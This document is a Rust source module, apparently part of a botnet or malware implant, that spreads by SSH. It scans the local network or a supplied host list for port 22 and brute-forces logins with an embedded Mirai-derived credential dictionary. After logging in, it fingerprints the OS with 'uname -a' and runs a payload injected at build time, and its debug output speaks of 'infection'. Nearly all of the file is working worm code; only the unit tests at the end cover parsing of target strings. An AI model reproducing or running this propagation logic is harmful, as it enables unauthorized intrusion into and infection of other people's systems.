use std::io::Read;
use std::net::TcpStream;
use std::sync::Mutex;
use ssh2::Session;
use crate::tasks::{NetworkHost, Port, RunningTasks, scan_local_net};
use rayon::prelude::*;
use crate::models::TaskResult;
use crate::tasks::network_scan::parse_ports;

pub const SSH_PORT: u16 = 22;
const SSH_CONNECT_TIMEOUT: u32 = 5000;
const SPREAD_THREADS: usize = 6;
static OS_ID_COMMAND: &'static str = "uname -a";
static DICTIONARY: &'static str = include_str!("../../src/ext/mirai-botnet.txt");

//static LINUX: &'static str = "linux";
static LINUX_PAYLOAD: &'static str = env!("SSH_PAYLOAD_LINUX");
static MACOS: &'static str = "darwin";
static MACOS_PAYLOAD: &'static str = env!("SSH_PAYLOAD_LINUX");


/// Tries to connect to a host over SSH with given credentials
///
/// # Returns
/// If successful, a SSH session, otherwise an error
///
/// # Errors
/// If socket time out, or if the given credentials are invalid
fn ssh_connect(host: &String, username: &String, password: &String)
               -> Result<Session, anyhow::Error> {
    let tcp = TcpStream::connect(host)?;
    let mut sess = Session::new()?;
    sess.set_timeout(SSH_CONNECT_TIMEOUT);
    sess.set_tcp_stream(tcp);
    sess.handshake()?;
    sess.userauth_password(username.as_str(), password.as_str())?;
    if !sess.authenticated() {
        return Err(anyhow::Error::msg("SSH authentication failed"));
    }

    Ok(sess)
}

/// Runs a command in a given SSH session
///
/// # Returns
/// If successful, the output string, otherwise an error
///
/// # Errors
/// If the session fails to generate a channel, fails to execute the command, fails to read the
/// output or fails to close the channel
fn run_command(sess: &Session, command: String) -> Result<String, anyhow::Error> {
    // Run command
    let mut channel = sess.channel_session()?;
    channel.exec(command.as_str())?;

    // Collect output
    let mut s = String::new();
    channel.read_to_string(&mut s)?;
    let _ = channel.wait_close();

    Ok(s)
}

/// Attempts to identify the OS of the given SSH session by running 'uname -a'
///
/// # Returns
/// If successful, if the OS is either Linux or Macos, otherwise, an error
///
/// # Errors
/// If the command fails, or if the output fails during parsing
fn identify_os(sess: &Session) -> Result<String, anyhow::Error> {
    let output = run_command(sess, OS_ID_COMMAND.to_string())?;
    let split_output = output.split(' ').collect::<Vec<&str>>();

    if split_output.len() < 1 {
        return Err(anyhow::Error::msg("Failed to parse OS identification string"));
    }
    let host_os = split_output[0].to_lowercase().to_string();

    #[cfg(debug_assertions)]
    println!("Identified host OS: {}", host_os);

    Ok(host_os)
}


/// Attempts to spread to another host
/// Firsts attempts to initialise a connection with the given credentials,
/// then tries to identify what OS the host runs and finally tries to execute a payload
///
/// # Returns
/// If successfully connected to the host, the host with correct credentials is returned,
/// included with the host OS and if the payload was run or not (if those operations are successful)
fn try_ssh_spread(host: &String, username: &String, password: &String) -> Option<String> {
    // Initialise connection
    let sess = match ssh_connect(host, username, password) {
        Ok(val) => val,
        Err(_) => {
            return None;
        }
    };

    #[cfg(debug_assertions)]
    println!("Connected to host: {} {}:{}", host, username, password);
    let mut res = format!("{} {}:{}",
                          host.to_string(),
                          username.to_string(),
                          password.to_string());

    // Identify OS
    let host_os = match identify_os(&sess) {
        Ok(val) => val,
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to identify OS: {}", e);
            return Some(res);
        }
    };
    res.push_str(&*format!(" {}", host_os));

    // Chose payload based on OS
    let payload = if host_os == MACOS {
        MACOS_PAYLOAD.to_string()
    } else {
        // If not MacOS, assume and test Linux!
        LINUX_PAYLOAD.to_string()
    };

    // Execute payload
    match run_command(&sess, payload) {
        Ok(_) => {
            #[cfg(debug_assertions)]
            println!("Ran payload on host {}, pray for successful infection...", host);
            res.push_str(" - Payload was run");
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to run payload: {}", e);
            res.push_str(" - Payload failed to run");
        }
    };

    return Some(res);
}

/// Tries to spread to a set of given hosts over SSH
///
/// # Return
/// A set of all hosts that the SSH spread was successful in some way, where the least
/// information is the correct SSH credentials for that host.
///
/// # Errors
/// If fails to create the thread pool
fn run_ssh_spread(hosts: Vec<NetworkHost>) -> Result<Vec<String>, anyhow::Error> {
    let res: Mutex<Vec<String>> = Mutex::new(Vec::new());

    #[cfg(debug_assertions)]
    println!("Trying to spread to hosts: {:?}", hosts);
    let mut init_res = "Trying to spread to hosts:\n".to_string();
    for h in &hosts {
        init_res.push_str(&*format!("{}\n", &*h.to_string()));
    }
    res.lock().unwrap().push(init_res);

    let pool = rayon::ThreadPoolBuilder::new()
        .num_threads(SPREAD_THREADS)
        .build()?;


    pool.install(|| {
        DICTIONARY
            .split("\n")
            .collect::<Vec<&str>>()
            .into_par_iter()
            .map(|un_pw| {
                let split = un_pw.split(' ').collect::<Vec<&str>>();
                for h in &hosts {
                    if split.len() != 2 {
                        continue;
                    }
                    match try_ssh_spread(
                        &format!("{}:{}", h.ip, h.open_ports[0].port),
                        &split[0].to_string(),
                        &split[1].to_string()) {
                        Some(val) => res.lock().unwrap().push(val),
                        _ => {}
                    };
                }
                un_pw
            })
            .collect::<Vec<&str>>();
    });
    let res = res.lock().unwrap().clone();
    Ok(res)
}

/// Parses the hosts from a target hosts string
/// Hosts are separated with ';', and target ports are specified with ':'
///
/// # Example
/// Parsed hosts are defined as [(IP, PORTS)]
/// "1.2.3.4:21-23" => [(1.2.3.4, 21,22,23)]
/// "1.2.3.4:21-23; 4.3.2.1" =>  [(1.2.3.4, 21,22,23), (4.3.2.1, 22)]
/// "1.2.3.4:21,22,23; 4.3.2.1:" =>  [(1.2.3.4, 21,22,23), (4.3.2.1, 22)]
///
/// # Returns
/// Vector of NetworkHosts containing the parsed hosts with ports
fn parse_target_hosts(data: String) -> Vec<NetworkHost> {
    let mut hosts: Vec<NetworkHost> = Vec::new();
    for h in data.split(';').collect::<Vec<&str>>() {
        if h.contains(':') {
            // Ports are defined, also needs to parse ports
            let h_split = h.split(':').collect::<Vec<&str>>();
            let ports = parse_ports(h_split[1].to_string())
                .into_iter()
                .map(|p| {
                    Port {
                        port: p,
                        is_open: true,
                    }
                }).collect::<Vec<Port>>();
            // Ports are parsed, add to hosts
            hosts.push(NetworkHost {
                ip: h_split[0].trim().to_string(),
                open_ports: if ports.is_empty() {
                    [Port { port: SSH_PORT, is_open: true }].to_vec()
                } else {
                    ports
                },
            })
        } else if h.trim() != "" {
            // No ports are defined, add default port
            hosts.push(NetworkHost {
                ip: h.trim().to_string(),
                open_ports: vec![Port { port: SSH_PORT, is_open: true }],
            })
        }
    }
    hosts
}

/// Tries to spread to other hosts on the local net by using SSH and a dictionary with credentials
/// Intended to be run on another thread than the main thread, puts the resulting data in
/// RUNNING_TASKS
pub fn ssh_spread(running_tasks: &Mutex<RunningTasks>, task_id: String, host_string: String) {
    let hosts;
    if !host_string.is_empty() {
        // Uses hosts defined in
        hosts = parse_target_hosts(host_string);
    } else {
        // No hosts are defined, will try all on the local network
        let ports = [SSH_PORT].to_vec();
        hosts = match scan_local_net(ports) {
            Ok(val) => val,
            Err(e) => {
                let res = format!("Failed to get hosts when scanning the local network: {}",
                                  e);
                #[cfg(debug_assertions)]
                println!("{}", res);
                running_tasks.lock().unwrap().add_task_result(TaskResult {
                    id: task_id,
                    status: 1,
                    result: res,
                });
                return;
            }
        };
    }

    if hosts.is_empty() {
        let res = "No host detected, nothing to spread to";
        #[cfg(debug_assertions)]
        println!("{}", res);
        running_tasks.lock().unwrap().add_task_result(TaskResult {
            id: task_id,
            status: 1,
            result: res.to_string(),
        });
        return;
    }

    let spread_to = match run_ssh_spread(hosts) {
        Ok(val) => val,
        Err(e) => {
            let res = format!("Failed to spread to hosts: {}", e);
            #[cfg(debug_assertions)]
            println!("{}", res);
            running_tasks.lock().unwrap().add_task_result(TaskResult {
                id: task_id,
                status: 1,
                result: res.to_string(),
            });
            return;
        }
    };

    let mut res = "SSH spread results:\n".to_string();
    res.push_str(&*spread_to.join("\n"));
    let task_result = TaskResult {
        id: task_id,
        status: 0,
        result: res,
    };

    running_tasks.lock().unwrap().add_task_result(task_result);
}

#[cfg(test)]
mod tests {
    use crate::tasks::Port;
    use super::*;

    fn test_hosts(hosts: Vec<NetworkHost>, expected: Vec<NetworkHost>) {
        for i in 0..expected.len() {
            assert_eq!(hosts[i].to_string(), expected[i].to_string());
        }
    }

    const HOST_STRING: &'static str = "192.168.1.1:22,23,24; 192.168.1.2:21-23,24;";

    #[test]
    fn test_parse_target_host() {
        let expected_hosts: [NetworkHost; 2] = [
            NetworkHost {
                ip: "192.168.1.1".to_string(),
                open_ports: vec![Port { port: 22, is_open: true },
                                 Port { port: 23, is_open: true },
                                 Port { port: 24, is_open: true }],
            },
            NetworkHost {
                ip: "192.168.1.2".to_string(),
                open_ports: vec![Port { port: 21, is_open: true },
                                 Port { port: 22, is_open: true },
                                 Port { port: 23, is_open: true },
                                 Port { port: 24, is_open: true }],
            }
        ];
        test_hosts(expected_hosts.to_vec(),
                   parse_target_hosts(HOST_STRING.to_string()));
    }

    const HOST_STRING1: &'static str = "192.168.1.1:22,23,65536; 192.168.1.2:; 192.168.1.3";

    #[test]
    fn test_parse_target_host_invalid_ports() {
        let expected_hosts: [NetworkHost; 3] = [
            NetworkHost {
                ip: "192.168.1.1".to_string(),
                open_ports: vec![Port { port: 22, is_open: true },
                                 Port { port: 23, is_open: true }],
            },
            NetworkHost {
                ip: "192.168.1.2".to_string(),
                open_ports: vec![Port { port: SSH_PORT, is_open: true }],
            },
            NetworkHost {
                ip: "192.168.1.3".to_string(),
                open_ports: vec![Port { port: SSH_PORT, is_open: true }],
            }
        ];
        test_hosts(parse_target_hosts(HOST_STRING1.to_string()),
                   expected_hosts.to_vec());
    }

    const HOST_STRING2: &'static str = "192.168.1.1:22-24";

    #[test]
    fn test_parse_target_single_host() {
        let expected_hosts: [NetworkHost; 1] = [
            NetworkHost {
                ip: "192.168.1.1".to_string(),
                open_ports: vec![Port { port: 22, is_open: true },
                                 Port { port: 23, is_open: true },
                                 Port { port: 24, is_open: true }],
            }];
        test_hosts(expected_hosts.to_vec(),
                   parse_target_hosts(HOST_STRING2.to_string()));
    }
}